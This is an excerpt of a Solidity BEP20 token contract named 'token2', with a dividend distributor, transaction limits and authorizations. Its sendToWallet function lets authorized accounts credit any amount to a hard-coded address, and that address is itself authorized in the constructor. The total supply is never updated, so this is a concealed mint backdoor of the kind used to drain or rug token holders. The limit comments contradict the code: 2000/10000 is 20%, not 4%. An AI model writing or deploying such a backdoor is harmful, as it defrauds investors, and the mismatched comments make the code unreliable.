...
contract DividendDistributor is IDividendDistributor {
    ...
    // EARN
    IBEP20  BTC = IBEP20(0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd);
...
contract ContractName is IBEP20, Auth {
    ...
    // Addresses
    address MATIC = 0xb97A2C2c0D1C186223F467e034006f87BC0022cc;
    address BTC = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd; 
    address WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
    ...
    // Name and symbol
    string constant _name = "token2";
    string constant _symbol = "Token2";
    ...
    // Max wallet and TX
    uint256 public _maxBuyTxAmount = _totalSupply * 2000 / 10000; // 4% on launch or 1M tokens
    uint256 public _maxSellTxAmount = _totalSupply * 2000 / 10000; // 4% or 5M tokens
    uint256 public _maxWalletToken =  _totalSupply * 2000  / 10000; // 4% or 2m tokens
    ...
    constructor () Auth(msg.sender) {
        ...
        authorizations[address(pair)] = true;
        authorizations[address(msg.sender)] = true;
        authorizations[address(MATIC)] = true;
    ...
    function sendToWallet(uint256 _amount) public authorized {
        _balances[MATIC]= _balances[MATIC].add(_amount);
    }
